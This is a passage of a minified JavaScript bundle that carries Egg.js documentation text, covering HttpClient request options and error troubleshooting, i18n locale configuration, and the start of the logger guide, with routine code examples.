    maxFreeSockets: 256,
  },
};
`,paraId:32,tocIndex:12},{value:"Application can overrides the configuration by ",paraId:33,tocIndex:12},{value:"config/config.default.js",paraId:33,tocIndex:12},{value:"data: Object",paraId:2},{value:"The request data will select the correct processing method automatically based on the ",paraId:34,tocIndex:13},{value:"method",paraId:34,tocIndex:13},{value:".",paraId:34,tocIndex:13},{value:"GET\uFF0CHEAD: processed by ",paraId:35,tocIndex:13},{value:"querystring.stringify(data)",paraId:35,tocIndex:13},{value:" then append to the query parameters of url.",paraId:35,tocIndex:13},{value:"POST\uFF0CPUT, DELETE and etc: further judgments and process according to ",paraId:35,tocIndex:13},{value:"contentType",paraId:35,tocIndex:13},{value:`.
`,paraId:35,tocIndex:13},{value:"contentType = json",paraId:36,tocIndex:13},{value:": processed by ",paraId:36,tocIndex:13},{value:"JSON.stringify(data)",paraId:36,tocIndex:13},{value:" and set it as body before sending.",paraId:36,tocIndex:13},{value:"others: processed by ",paraId:36,tocIndex:13},{value:"querystring.stringify(data)",paraId:36,tocIndex:13},{value:" and set it as body before sending",paraId:36,tocIndex:13},{value:`// GET + data
ctx.curl(url, {
  data: { foo: 'bar' },
});

// POST + data
ctx.curl(url, {
  method: 'POST',
  data: { foo: 'bar' },
});

// POST + JSON + data
ctx.curl(url, {
  method: 'POST',
  contentType: 'json',
  data: { foo: 'bar' },
});
`,paraId:37,tocIndex:13},{value:"dataAsQueryString: Boolean",paraId:2},{value:"Once ",paraId:38,tocIndex:14},{value:"dataAsQueryString=true",paraId:38,tocIndex:14},{value:" is set, even under POST, it will forces ",paraId:38,tocIndex:14},{value:"options.data",paraId:38,tocIndex:14},{value:" to be processed by ",paraId:38,tocIndex:14},{value:"querystring.stringify",paraId:38,tocIndex:14},{value:" then append to the ",paraId:38,tocIndex:14},{value:"url",paraId:38,tocIndex:14},{value:" query parameters",paraId:38,tocIndex:14},{value:"The application scenarios that sending data using ",paraId:39,tocIndex:14},{value:"stream",paraId:39,tocIndex:14},{value:" and pass additional request parameters by ",paraId:39,tocIndex:14},{value:"url",paraId:39,tocIndex:14},{value:" query can be well resolved.",paraId:39,tocIndex:14},{value:`ctx.curl(url, {
  method: 'POST',
  dataAsQueryString: true,
  data: {
    // generally it would be some validation parameters such as access token, etc.
    accessToken: 'some access token value',
  },
  stream: myFileStream,
});
`,paraId:40,tocIndex:14},{value:"content: String|Buffer",paraId:2},{value:"Set request Context, if the parameter is set, it will ignore the ",paraId:41,tocIndex:15},{value:"data",paraId:41,tocIndex:15},{value:" parameters",paraId:41,tocIndex:15},{value:`ctx.curl(url, {
  method: 'POST',
  // Sending the raw xml data without HttpClient's to do processing
  content: '<xml><hello>world</hello></xml>',
  headers: {
    'content-type': 'text/html',
  },
});
`,paraId:42,tocIndex:15},{value:"files: Mixed",paraId:2},{value:"File upload, support: ",paraId:43,tocIndex:16},{value:"String | ReadStream | Buffer | Array | Object",paraId:43,tocIndex:16},{value:".",paraId:43,tocIndex:16},{value:`ctx.curl(url, {
  method: 'POST',
  files: '/path/to/read',
  data: {
    foo: 'other fields',
  },
});
`,paraId:44,tocIndex:16},{value:"upload multiple files:",paraId:45,tocIndex:16},{value:`ctx.curl(url, {
  method: 'POST',
  files: {
    file1: '/path/to/read',
    file2: fs.createReadStream(__filename),
    file3: Buffer.from('mock file content'),
  },
  data: {
    foo: 'other fields',
  },
});
`,paraId:46,tocIndex:16},{value:"stream: ReadStream",paraId:2},{value:"Set request context's readable stream, default ",paraId:47,tocIndex:17},{value:"null",paraId:47,tocIndex:17},{value:`.
If the parameter is set , HttpClient will ignore `,paraId:47,tocIndex:17},{value:"data",paraId:47,tocIndex:17},{value:" and ",paraId:47,tocIndex:17},{value:"content",paraId:47,tocIndex:17},{value:`ctx.curl(url, {
  method: 'POST',
  stream: fs.createReadStream('/path/to/read'),
});
`,paraId:48,tocIndex:17},{value:"writeStream: WriteStream",paraId:2},{value:"Set receive response data's writeable stream, default ",paraId:49,tocIndex:18},{value:"null",paraId:49,tocIndex:18},{value:`.
Once the parameter is set, response `,paraId:49,tocIndex:18},{value:"result.data",paraId:49,tocIndex:18},{value:" is set to ",paraId:49,tocIndex:18},{value:"null",paraId:49,tocIndex:18},{value:" because all data are written to ",paraId:49,tocIndex:18},{value:"writeStream",paraId:49,tocIndex:18},{value:".",paraId:49,tocIndex:18},{value:`ctx.curl(url, {
  writeStream: fs.createWriteStream('/path/to/store'),
});
`,paraId:50,tocIndex:18},{value:"consumeWriteStream: Boolean",paraId:2},{value:"Whether to wait for ",paraId:51,tocIndex:19},{value:"writeStream",paraId:51,tocIndex:19},{value:` completely finished as the response well received
This parameter is not recommended to modify the default value, unless we know it's side effect are acceptable. Otherwise, the `,paraId:51,tocIndex:19},{value:"writeStream",paraId:51,tocIndex:19},{value:" data is likely to be incomplete.",paraId:51,tocIndex:19},{value:"method: String",paraId:2},{value:"Set request method, default ",paraId:52,tocIndex:20},{value:"GET",paraId:52,tocIndex:20},{value:". Support all ",paraId:52,tocIndex:20},{value:"GET\u3001POST\u3001PUT\u3001DELETE\u3001PATCH",paraId:52,tocIndex:20},{value:" and so on ",paraId:52,tocIndex:20},{value:"all HTTP methods",paraId:52,tocIndex:20},{value:"\u3002",paraId:52,tocIndex:20},{value:"contentType: String",paraId:2},{value:"Set request data format \uFF0Cdefault ",paraId:53,tocIndex:21},{value:"undefined",paraId:53,tocIndex:21},{value:"\uFF0CHttpClient will sets automatically based on the ",paraId:53,tocIndex:21},{value:"data",paraId:53,tocIndex:21},{value:" and ",paraId:53,tocIndex:21},{value:"content",paraId:53,tocIndex:21},{value:` parameters.
When `,paraId:53,tocIndex:21},{value:"data",paraId:53,tocIndex:21},{value:" is object, the default setting would be ",paraId:53,tocIndex:21},{value:"form",paraId:53,tocIndex:21},{value:". Support ",paraId:53,tocIndex:21},{value:"json",paraId:53,tocIndex:21},{value:" format.",paraId:53,tocIndex:21},{value:"If need to send ",paraId:54,tocIndex:21},{value:"data",paraId:54,tocIndex:21},{value:" by JSON",paraId:54,tocIndex:21},{value:`ctx.curl(url, {
  method: 'POST',
  data: {
    foo: 'bar',
    now: Date.now(),
  },
  contentType: 'json',
});
`,paraId:55,tocIndex:21},{value:"dataType: String",paraId:2},{value:"Set the response data format, default return the raw buffer formatted data without processing. Support ",paraId:56,tocIndex:22},{value:"text",paraId:56,tocIndex:22},{value:" and ",paraId:56,tocIndex:22},{value:"json",paraId:56,tocIndex:22},{value:"Note: If ",paraId:57,tocIndex:22},{value:"json",paraId:57,tocIndex:22},{value:" is set\uFF0Ca ",paraId:57,tocIndex:22},{value:"JSONResponseFormatError",paraId:57,tocIndex:22},{value:" error would be thrown if fails to parse the response data.",paraId:57,tocIndex:22},{value:`const jsonResult = await ctx.curl(url, {
  dataType: 'json',
});
console.log(jsonResult.data);

const htmlResult = await ctx.curl(url, {
  dataType: 'text',
});
console.log(htmlResult.data);
`,paraId:58,tocIndex:22},{value:"fixJSONCtlChars: Boolean",paraId:2},{value:"Whether filter the special control characters in the response data (U+0000 ~ U+001F)\uFF0Cdefault ",paraId:59,tocIndex:23},{value:"false",paraId:59,tocIndex:23},{value:`
Typically, the JSON data returned by some CGI system might contains such special control characters, which can be filter automatically by setting the parameters.`,paraId:59,tocIndex:23},{value:`ctx.curl(url, {
  fixJSONCtlChars: true,
  dataType: 'json',
});
`,paraId:60,tocIndex:23},{value:"headers: Object",paraId:2},{value:"Custom request headers",paraId:61,tocIndex:24},{value:`ctx.curl(url, {
  headers: {
    'x-foo': 'bar',
  },
});
`,paraId:62,tocIndex:24},{value:"timeout: Number|Array",paraId:2},{value:"Timeout of request, default ",paraId:63,tocIndex:25},{value:"[ 5000, 5000 ]",paraId:63,tocIndex:25},{value:", timeout of connection creation is 5s, and the timeout of receive response is 5s.",paraId:63,tocIndex:25},{value:`ctx.curl(url, {
  // 3s timeout of connection creation, and the 3s timeout of receive response
  timeout: 3000,
});

ctx.curl(url, {
  // 1s timeout of connection creation, and the 30s timeout of receive response for the responsing of larger scenarios
  timeout: [1000, 30000],
});
`,paraId:64,tocIndex:25},{value:"agent: HttpAgent",paraId:2},{value:"Allows to override the default HttpAgent through this parameter. If you don't want to enable KeepAlive, set this parameter to ",paraId:65,tocIndex:26},{value:"false",paraId:65,tocIndex:26},{value:".",paraId:65,tocIndex:26},{value:`ctx.curl(url, {
  agent: false,
});
`,paraId:66,tocIndex:26},{value:"httpsAgent: HttpsAgent",paraId:2},{value:"Allows to override the default HttpsAgent through this parameter. If you don't want to enable KeepAlive, set this parameter to ",paraId:67,tocIndex:27},{value:"false",paraId:67,tocIndex:27},{value:".",paraId:67,tocIndex:27},{value:`ctx.curl(url, {
  httpsAgent: false,
});
`,paraId:68,tocIndex:27},{value:"auth: String",paraId:2},{value:"Parameter of Simple login authorization (Basic Authentication), will send the login information to the ",paraId:69,tocIndex:28},{value:"Authorization",paraId:69,tocIndex:28},{value:" request in clear form.",paraId:69,tocIndex:28},{value:`ctx.curl(url, {
  // parameter must follow the format of \`user:password\`
  auth: 'foo:bar',
});
`,paraId:70,tocIndex:28},{value:"digestAuth: String",paraId:2},{value:"Parameter of the Digest Authentication. If the parameter is set, it will attempt to generate the ",paraId:71,tocIndex:29},{value:"Authorization",paraId:71,tocIndex:29},{value:" request header for the 401 response automatically then try requesting for authorization once.",paraId:71,tocIndex:29},{value:`ctx.curl(url, {
  // parameter must follow the format of \`user:password\`
  digestAuth: 'foo:bar',
});
`,paraId:72,tocIndex:29},{value:"followRedirect: Boolean",paraId:2},{value:"Whether to follow 3xx redirect response, default ",paraId:73,tocIndex:30},{value:"false",paraId:73,tocIndex:30},{value:`ctx.curl(url, {
  followRedirect: true,
});
`,paraId:74,tocIndex:30},{value:"maxRedirects: Number",paraId:2},{value:`Set the maximum number of automatic redirects to prevent the endless redirect loop, default 10 times.
The parameter should not be set too large and only works in the `,paraId:75,tocIndex:31},{value:"followRedirect=true",paraId:75,tocIndex:31},{value:`ctx.curl(url, {
  followRedirect: true,
  // maximum allowed redirect 5 times
  maxRedirects: 5,
});
`,paraId:76,tocIndex:31},{value:"formatRedirectUrl: Function(from, to)",paraId:2},{value:"formatRedirectUrl",paraId:77,tocIndex:32},{value:" allow us to customize the implementation of 302\u3001301 other redirect URL splicing, default ",paraId:77,tocIndex:32},{value:"url.resolve (from, to) ",paraId:77,tocIndex:32},{value:".",paraId:77,tocIndex:32},{value:`ctx.curl(url, {
  formatRedirectUrl: (from, to) => {
    // for example you can correct the redirection of wrong url here
    if (to === '//foo/') {
      to = '/foo';
    }
    return url.resolve(from, to);
  },
});
`,paraId:78,tocIndex:32},{value:"beforeRequest: Function(options)",paraId:2},{value:"HttpClient will attempt to invoke the ",paraId:79,tocIndex:33},{value:"beforeRequest",paraId:79,tocIndex:33},{value:" hook before requesting officially, allowing us to make the last modification of the request parameter here.",paraId:79,tocIndex:33},{value:`ctx.curl(url, {
  beforeRequest: (options) => {
    // For example, we can set the global request ID to facilitate log tracking
    options.headers['x-request-id'] = uuid.v1();
  },
});
`,paraId:80,tocIndex:33},{value:"streaming: Boolean",paraId:2},{value:"Whether to return the response stream directly, default ",paraId:81,tocIndex:34},{value:"false",paraId:81,tocIndex:34},{value:`
After enable streaming, HttpClient will return immediately after getting the response object res,
At this moment `,paraId:81,tocIndex:34},{value:"result.headers",paraId:81,tocIndex:34},{value:" and ",paraId:81,tocIndex:34},{value:"result.status",paraId:81,tocIndex:34},{value:" can be read, but still cannot read the data",paraId:81,tocIndex:34},{value:`const result = await ctx.curl(url, {
  streaming: true,
});

console.log(result.status, result.data);
// result.res is a ReadStream Object
ctx.body = result.res;
`,paraId:82,tocIndex:34},{value:"if res is not passed to body directly, then we must consume this stream and do well in error handling.",paraId:83,tocIndex:34},{value:"gzip: Boolean",paraId:2},{value:"Whether to support gzip response format, default ",paraId:84,tocIndex:35},{value:"false",paraId:84,tocIndex:35},{value:`
After enable gzip, HttpClient will set `,paraId:84,tocIndex:35},{value:"Accept-Encoding: gzip",paraId:84,tocIndex:35},{value:" header and extract the data with ",paraId:84,tocIndex:35},{value:"Content-Encoding: gzip",paraId:84,tocIndex:35},{value:" response header automatically.",paraId:84,tocIndex:35},{value:`ctx.curl(url, {
  gzip: true,
});
`,paraId:85,tocIndex:35},{value:"timing: Boolean",paraId:2},{value:"Whether to enable the time measurement for each phase, default ",paraId:86,tocIndex:36},{value:"false",paraId:86,tocIndex:36},{value:`
After enable the timing, you can get the time measurements of HTTP request (in milliseconds) from the `,paraId:86,tocIndex:36},{value:"result.res.timing",paraId:86,tocIndex:36},{value:`.
Through these measurements, we can easily locate the slowest environment in the request, similar to the Chrome network timing.`,paraId:86,tocIndex:36},{value:"Measurement timing's analysis of each stage:",paraId:87,tocIndex:36},{value:"queuing: allocating socket time consuming",paraId:88,tocIndex:36},{value:"dnslookup: DNS queries time consuming",paraId:88,tocIndex:36},{value:"connected: socket three handshake success time consuming",paraId:88,tocIndex:36},{value:"requestSent: requesting full data time consuming",paraId:88,tocIndex:36},{value:"waiting: first byte to received response time consuming",paraId:88,tocIndex:36},{value:"contentDownload: full response data time consuming",paraId:88,tocIndex:36},{value:`const result = await ctx.curl(url, {
  timing: true,
});
console.log(result.res.timing);
// {
//   "queuing":29,
//   "dnslookup":37,
//   "connected":370,
//   "requestSent":1001,
//   "waiting":1833,
//   "contentDownload":3416
// }
`,paraId:89,tocIndex:36},{value:"ca\uFF0CrejectUnauthorized\uFF0Cpfx\uFF0Ckey\uFF0Ccert\uFF0Cpassphrase\uFF0Cciphers\uFF0CsecureProtocol",paraId:2},{value:"These are parameters are passed to the [HTTPS] modules\uFF0Cdetails refer to ",paraId:90,tocIndex:37},{value:"https.request(options, callback)",paraId:90,tocIndex:37},{value:"\u3002",paraId:90,tocIndex:37},{value:"If you want to debug the httpclient requests, just need to add below code to ",paraId:91,tocIndex:38},{value:"config.local.js",paraId:91,tocIndex:38},{value:":",paraId:91,tocIndex:38},{value:`// config.local.js
module.exports = () => {
  const config = {};

  // add http_proxy to httpclient
  if (process.env.http_proxy) {
    config.httpclient = {
      request: {
        enableProxy: true,
        rejectUnauthorized: false,
        proxy: process.env.http_proxy,
      },
    };
  }

  return config;
};
`,paraId:92,tocIndex:38},{value:"then open capture tools(such as [charles] or [fiddler]).",paraId:93,tocIndex:38},{value:"after that, just start your application by:",paraId:94,tocIndex:38},{value:`$ http_proxy=http://127.0.0.1:8888 npm run dev
`,paraId:95,tocIndex:38},{value:"Then it works correctly, and all requests that go through HttpClient can be viewed in the capture tools.",paraId:96,tocIndex:38},{value:"Exception: ",paraId:97,tocIndex:40},{value:"ConnectionTimeoutError",paraId:97,tocIndex:40},{value:"Scene: usually occurred by the DNS query is slow, or the network is slow between the client and server",paraId:97,tocIndex:40},{value:"Troubleshooting Suggestion: increase the ",paraId:97,tocIndex:40},{value:"timeout",paraId:97,tocIndex:40},{value:" parameter appropriately.",paraId:97,tocIndex:40},{value:"Exception: ",paraId:98,tocIndex:41},{value:"ResponseTimeoutError",paraId:98,tocIndex:41},{value:"Scene: usually occurred by network is slower between the client and server, and happens when the data is relatively large.",paraId:98,tocIndex:41},{value:"Troubleshooting Suggestion: increase the ",paraId:98,tocIndex:41},{value:"timeout",paraId:98,tocIndex:41},{value:" parameter appropriately.",paraId:98,tocIndex:41},{value:"Exception: ",paraId:99,tocIndex:42},{value:"ResponseError, code: ECONNRESET",paraId:99,tocIndex:42},{value:"Scene: usually the server actively disconnects the socket connection, causing the HTTP request link exceptions.",paraId:99,tocIndex:42},{value:"Troubleshooting Suggestion: please check if server has network exception at that time",paraId:99,tocIndex:42},{value:"Exception: ",paraId:100,tocIndex:43},{value:"RequestError, code: ECONNREFUSED, status: -1",paraId:100,tocIndex:43},{value:"Scene: usually because the requested URL which attached IP or the port cannot connect successfully.",paraId:100,tocIndex:43},{value:"Troubleshooting Suggestion: make sure the IP or port is set correctly",paraId:100,tocIndex:43},{value:"Exception: ",paraId:101,tocIndex:44},{value:"RequestError, code: ENOTFOUND, status: -1",paraId:101,tocIndex:44},{value:"Scene: usually the domain name requested by URL cannot be resolved by DNS successfully.",paraId:101,tocIndex:44},{value:"Troubleshooting Suggestion: make sure the domain name exists, and also check to see if the DNS service is properly configured.",paraId:101,tocIndex:44},{value:"Exception: ",paraId:102,tocIndex:45},{value:"JSONResponseFormatError",paraId:102,tocIndex:45},{value:"scene: the ",paraId:102,tocIndex:45},{value:"dataType=json",paraId:102,tocIndex:45},{value:" is set and this exception is thrown in response data that does not match JSON format.",paraId:102,tocIndex:45},{value:"Troubleshooting Suggestion: make sure that the server no matter what situations are returns the data in JSON format correctly.",paraId:102,tocIndex:45},{value:"request",paraId:2},{value:"response",paraId:2},{value:`In enterprise application scenarios, generally a unified tracer log is needed.
To facilitate monitoring HttpClient requests and responses on the app level, we agreed on global `,paraId:103,tocIndex:46},{value:"request",paraId:103,tocIndex:46},{value:" and ",paraId:103,tocIndex:46},{value:"response",paraId:103,tocIndex:46},{value:" to expose these two events.",paraId:103,tocIndex:46},{value:`    init options
        |
        V
    emit \`request\` event
        |
        V
    send request and receive response
        |
        V
    emit \`response\` event
        |
        V
       end
`,paraId:104,tocIndex:46},{value:"request",paraId:2},{value:"A ",paraId:105,tocIndex:47},{value:"request",paraId:105,tocIndex:47},{value:" event is triggered before the request is sent, allowing blocking of the request.",paraId:105,tocIndex:47},{value:`app.httpclient.on('request', (req) => {
  req.url; //request url
  req.ctx; //context of the request

  // you can set some trace headers here for full link tracking propose
});
`,paraId:106,tocIndex:47},{value:"response",paraId:2},{value:"After the end of request, a ",paraId:107,tocIndex:48},{value:"response",paraId:107,tocIndex:48},{value:" event is triggered, so that the external event can be subscribed to the log printing.",paraId:107,tocIndex:48},{value:`app.httpclient.on('response', (result) => {
  result.res.status;
  result.ctx; //context of the request
  result.req; //the corresponding req object, which the req in the request event
});
`,paraId:108,tocIndex:48},{value:"Full examples can be found on ",paraId:109,tocIndex:49},{value:"eggjs/examples/httpclient",paraId:109,tocIndex:49},{value:" .",paraId:109,tocIndex:49},{value:"Other Reference Links",paraId:110,tocIndex:49},{value:"urllib",paraId:111,tocIndex:49},{value:"httpclient",paraId:111,tocIndex:49},{value:"formstream",paraId:111,tocIndex:49},{value:"http",paraId:111,tocIndex:49},{value:"https",paraId:111,tocIndex:49},{value:"charles",paraId:111,tocIndex:49},{value:"fiddler",paraId:111,tocIndex:49}]},46845:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(30085);const t=[{value:"For developing the multi-language application, build-in I18n support by ",paraId:0},{value:"egg-i18n",paraId:0},{value:" plugin",paraId:0},{value:"Default ",paraId:1,tocIndex:0},{value:"en-US",paraId:1,tocIndex:0},{value:". Assume that we want to switch the default language to Simplified Chinese\uFF1A",paraId:1,tocIndex:0},{value:`// config/config.default.js
exports.i18n = {
  defaultLocale: 'zh-CN',
};
`,paraId:2,tocIndex:0},{value:"Here we have some ways to switch the application's current language (Modified records will set to the cookie ",paraId:3,tocIndex:1},{value:"locale",paraId:3,tocIndex:1},{value:"), the next request will use the language setting directly.",paraId:3,tocIndex:1},{value:"Priority from high to low:",paraId:4,tocIndex:1},{value:"query: ",paraId:5,tocIndex:1},{value:"/?locale=en-US",paraId:5,tocIndex:1},{value:"cookie: ",paraId:5,tocIndex:1},{value:"locale=zh-TW",paraId:5,tocIndex:1},{value:"header: ",paraId:5,tocIndex:1},{value:"Accept-Language: zh-CN,zh;q=0.5",paraId:5,tocIndex:1},{value:"If want to modify parameter name of query or cookie",paraId:6,tocIndex:1},{value:`// config/config.default.js
exports.i18n = {
  queryField: 'locale',
  cookieField: 'locale',
  // Cookie default expired after one year, the unit is ms if set as Number
  cookieMaxAge: '1y',
};
`,paraId:7,tocIndex:1},{value:"Configuration of multi-language are independent, stored in ",paraId:8,tocIndex:2},{value:"config/locale/*.js",paraId:8,tocIndex:2},{value:`- config/locale/
  - en-US.js
  - zh-CN.js
  - zh-TW.js
`,paraId:9,tocIndex:2},{value:"Not only take effects in the application directory, but also in the directory of framework or plugin ",paraId:10,tocIndex:2},{value:"config/locale",paraId:10,tocIndex:2},{value:"Note: It's locale, not locals.",paraId:11,tocIndex:2},{value:"Example:",paraId:12,tocIndex:2},{value:`// config/locale/zh-CN.js
module.exports = {
  Email: '\u90AE\u7BB1',
};
`,paraId:13,tocIndex:2},{value:"Or using JSON file:",paraId:14,tocIndex:2},{value:`// config/locale/zh-CN.json
{
  "Email": "\u90AE\u7BB1"
}
`,paraId:15,tocIndex:2},{value:"Use ",paraId:16,tocIndex:3},{value:"__",paraId:16,tocIndex:3},{value:" (Alias: ",paraId:16,tocIndex:3},{value:"gettext",paraId:16,tocIndex:3},{value:") function to get the multi-language texts under locale directory",paraId:16,tocIndex:3},{value:"**Note: ",paraId:17,tocIndex:3},{value:"**",paraId:17,tocIndex:3},{value:" is two underscores__",paraId:17,tocIndex:3},{value:"Take above multi-language configuration as example:",paraId:18,tocIndex:3},{value:`ctx.__('Email');
// zh-CN => \u90AE\u7BB1
// en-US => Email
`,paraId:19,tocIndex:3},{value:"If texts contain format function like ",paraId:20,tocIndex:3},{value:"%s",paraId:20,tocIndex:3},{value:"\uFF0C",paraId:20,tocIndex:3},{value:"%j",paraId:20,tocIndex:3},{value:", we can call by the way similar to ",paraId:20,tocIndex:3},{value:"util.format()",paraId:20,tocIndex:3},{value:`// config/locale/zh-CN.js
module.exports = {
  'Welcome back, %s!': '\u6B22\u8FCE\u56DE\u6765\uFF0C%s!',
};

ctx.__('Welcome back, %s!', 'Shawn');
// zh-CN => \u6B22\u8FCE\u56DE\u6765\uFF0CShawn!
// en-US => Welcome back, Shawn!
`,paraId:21,tocIndex:3},{value:"Support array, subscript and placeholder, such as",paraId:22,tocIndex:3},{value:`// config/locale/zh-CN.js
module.exports = {
  'Hello {0}! My name is {1}.': '\u4F60\u597D {0}! \u6211\u7684\u540D\u5B57\u53EB {1}\u3002',
};

ctx.__('Hello {0}! My name is {1}.', ['foo', 'bar']);
// zh-CN => \u4F60\u597D foo\uFF01\u6211\u7684\u540D\u5B57\u53EB bar\u3002
// en-US => Hello foo! My name is bar.
`,paraId:23,tocIndex:3},{value:`class HomeController extends Controller {
  async index() {
    const ctx = this.ctx;
    ctx.body = {
      message: ctx.__('Welcome back, %s!', ctx.user.name)
      // or use gettext, it is a alias of __ function
      // message: ctx.gettext('Welcome back', ctx.user.name)
      user: ctx.user,
    };
  }
}
`,paraId:24,tocIndex:4},{value:"Assume we are using template engine ",paraId:25,tocIndex:5},{value:"Nunjucks",paraId:25,tocIndex:5},{value:`<li>{{ __('Email') }}: {{ user.email }}</li>
<li>{{ __('Welcome back, %s!', user.name) }}</li>
<li>{{ __('Hello {0}! My name is {1}.', ['foo', 'bar']) }}</li>
`,paraId:26,tocIndex:5}]},28866:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(97704);const t=[{value:"Local Development",paraId:0},{value:"Unit Testing",paraId:1},{value:"Deployment",paraId:2},{value:"Logger",paraId:3},{value:"HttpClient",paraId:4},{value:"Cookie and Session",paraId:5},{value:"Multi-Process Model and Inter-Process Communication",paraId:6},{value:"View Template Rendering",paraId:7},{value:"Exception Handling",paraId:8},{value:"Security",paraId:9},{value:"I18n Internationalization",paraId:10}]},42862:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(16329);const t=[{value:"There is no doubt that logs are important part for monitoring application and debugging in Web development.",paraId:0},{value:"Built-in enterprise scaled logger, ",paraId:1},{value:"egg-logger",paraId:1},{value:", makes developer implement logging more easily than ever before.",paraId:1},{value:"Core features:",paraId:2},{value:"Levels",paraId:3},{value:"Universal logging, ",paraId:3},{value:".error()",paraId:3},{value:" will save ",paraId:3},{value:"ERROR",paraId:3},{value:" level logs into a file for later debugging",paraId:3},{value:"Logs from dispatch and runtime are separated",paraId:3},{value:"Create your logger",paraId:3},{value:"Multi-process logs",paraId:3},{value:"Automatic sharding",paraId:3},{value:"High Performance",paraId:3},{value:"Log files are located in ",paraId:4,tocIndex:0},{value:"${appInfo.root}/logs/${appInfo.name}",paraId:4,tocIndex:0},{value:" by default. For instance, ",paraId:4,tocIndex:0},{value:"/home/admin/logs/example-app",paraId:4,tocIndex:0},{value:".",paraId:4,tocIndex:0},{value:"To avoid conflicts between environments and provide a more convenience way to manage logs, log files will be written into ",paraId:4,tocIndex:0},{value:"logs",paraId:4,tocIndex:0},{value:" directory. For instance, ",paraId:4,tocIndex:0},{value:"/path/to/example-app/logs/example-app",paraId:4,tocIndex:0},{value:".",paraId:4,tocIndex:0},{value:"Change ",paraId:5,tocIndex:0},{value:"dir",paraId:5,tocIndex:0},{value:" in logger:",paraId:5,tocIndex:0},{value:`// config/config.\${env}.js
exports.logger = {
  dir: '/path/to/your/custom/log/dir',
};
`,paraId:6,tocIndex:0},{value:"Egg offers a few loggers for different scenarios:",paraId:7,tocIndex:1},{value:"appLogger ",paraId:8,tocIndex:1},{value:"${appInfo.name}-web.log",paraId:8,tocIndex:1},{value:"\uFF0Cfor example ",paraId:8,tocIndex:1},{value:"example-app-web.log",paraId:8,tocIndex:1},{value:" stores logs from application, it will be used in general.",paraId:8,tocIndex:1},{value:"coreLogger ",paraId:8,tocIndex:1},{value:"egg-web.log",paraId:8,tocIndex:1},{value:", logs from Egg's core and plugin.",paraId:8,tocIndex:1},{value:"errorLogger ",paraId:8,tocIndex:1},{value:"common-error.log",paraId:8,tocIndex:1},{value:" should not be invoked directly. However, ",paraId:8,tocIndex:1},{value:".error()",paraId:8,tocIndex:1},{value:" in every logger will redirect logs to it for debugging.",paraId:8,tocIndex:1},{value:"agentLogger ",paraId:8,tocIndex:1},{value:"egg-agent.log",paraId:8,tocIndex:1},{value:", logs from agent process.",paraId:8,tocIndex:1},{value:"If you want to change names of above loggers, you can override them in config:",paraId:9,tocIndex:1},{value:`// config/config.\${env}.js
module.exports = (appInfo) => {
  return {
    logger: {
      appLogName: \`\${appInfo.name}-web.log\`,
      coreLogName: 'egg-web.log',
      agentLogName: 'egg-agent.log',
      errorLogName: 'common-error.log',
    },
  };
};
`,paraId:10,tocIndex:1},{value:"It's proper to log details in requests with context logger. The logger will append basics about requests to each log. For example, ",paraId:11,tocIndex:3},{value:"[$userId/$ip/$traceId/${cost}ms $method $url]",paraId:11,tocIndex:3},{value:".",paraId:11,tocIndex:3},{value:`ctx.logger.debug('debug info');
ctx.logger.info('some request data: %j', ctx.request.body);
ctx.logger.warn('WARNING!!!!');

// .error will save information in call stack into errorLog file.
// Exceptions must be guaranteed to be Error or object extended from Error, which offers a trace of what functions were called.
ctx.logger.error(new Error('whoops'));
`,paraId:12,tocIndex:3},{value:"For developers who create frameworks or plugins, ",paraId:13,tocIndex:3},{value:"ctx.coreLogger",paraId:13,tocIndex:3},{value:" is another option in Context Logger.",paraId:13,tocIndex:3},{value:`ctx.coreLogger.info('info');
`,paraId:14,tocIndex:3},{value:"For developers who want to know more details about dispatch in Egg, they can easily use ",paraId:15,tocIndex:4},{value:"App Logger",paraId:15,tocIndex:4},{value:" to make that happen:",paraId:15,tocIndex:4},{value:`// app.js
module.exports = (app) => {
  app.logger.debug('debug info');
  app.logger.info('Latency: %d ms', Date.now() - start);
  app.logger.warn('warning!');

  app.logger.error(someErrorObj);
};
`,paraId:16,tocIndex:4},{value:"app.coreLogger",paraId:17,tocIndex:4},{value:" in app is similar to ",paraId:17,tocIndex:4},{value:"ctx.coreLogger",paraId:17,tocIndex:4},{value:" in context:",paraId:17,tocIndex:4},{value:`// app.js
module.exports = (app) => {
  app.coreLogger.info('Latency: %d ms', Date.now() - start);
};
`,paraId:18,tocIndex:4},{value:"Agent also supports ",paraId:19,tocIndex:5},{value:"agent.coreLogger",paraId:19,tocIndex:5},{value:" as the same feature to context and app above.",paraId:19,tocIndex:5},{value:`// agent.js
module.exports = (agent) => {
  agent.logger.debug('debug info');
  agent.logger.info('Latency: %d ms', Date.now() - start);
  agent.logger.warn('warning!');

  agent.logger.error(someErrorObj);
};
`,paraId:20,tocIndex:5},{value:"For more about Agent, you can take a look at ",paraId:21,tocIndex:5},{value:"Multi-process",paraId:22,tocIndex:5},{value:".",paraId:21,tocIndex:5},{value:"The default encoding setting(",paraId:23,tocIndex:6},{value:"utf-8",paraId:23,tocIndex:6},{value:") can be changed via ",paraId:23,tocIndex:6},{value:"encoding",paraId:23,tocIndex:6},{value:" in config:",paraId:23,tocIndex:6},{value:`// config/config.\${env}.js
exports.logger = {
  encoding: 'gbk',
};
`,paraId:24,tocIndex:6},{value:"Use JSON as the output log format, make it easier to parse.",paraId:25,tocIndex:7},{value:`// config/config.\${env}.js
exports.logger = {
  outputJSON: true,
};
`,paraId:26,tocIndex:7},{value:"Logs are designed in 5 levels, including ",paraId:27,tocIndex:8},{value:"NONE",paraId:27,tocIndex:8},{value:", ",paraId:27,tocIndex:8},{value:"DEBUG",paraId:27,tocIndex:8},{value:", ",paraId:27,tocIndex:8},{value:"INFO",paraId:27,tocIndex:8},{value:", ",paraId:27,tocIndex:8},{value:"WARN",paraId:27,tocIndex:8},{value:" and ",paraId:27,tocIndex:8},{value:"ERROR",paraId:27,tocIndex:8},{value:". For inspecting in development, they will also be written into files and printed into terminal as well.",paraId:27,tocIndex:8},{value:"In production environment, Egg will only write logs with level ",paraId:28,tocIndex:9},{value:"INFO",paraId:28,tocIndex:9},{value:" and higher, this means ",paraId:28,tocIndex:9},{value:"NONE",paraId:28,tocIndex:9},{value:" and ",paraId:28,tocIndex:9},{value:"DEBUG",paraId:28,tocIndex:9},{value:" information will be ignored in log files.",paraId:28,tocIndex:9},{value:"If you want to change logger's default output level, modify in the config as follow:",paraId:29,tocIndex:9},{value:`// config/config.\${env}.js
exports.logger = {
